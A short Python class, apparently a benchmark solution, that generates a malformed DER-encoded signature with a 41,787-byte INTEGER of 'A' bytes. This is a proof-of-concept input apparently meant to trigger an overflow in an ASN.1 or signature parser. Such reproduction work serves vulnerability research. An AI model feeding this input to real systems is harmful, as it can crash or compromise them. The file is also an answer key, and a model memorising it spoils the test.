class Solution:
    def solve(self, src_path: str) -> bytes:
        len_r = 41787
        r_value = b'A' * len_r
        r_part = b'\x02\x82\xa3\x3b' + r_value
        s_part = b'\x02\x01\x00'
        content = r_part + s_part
        seq_length_bytes = b'\x82\xa3\x42'
        return b'\x30' + seq_length_bytes + content
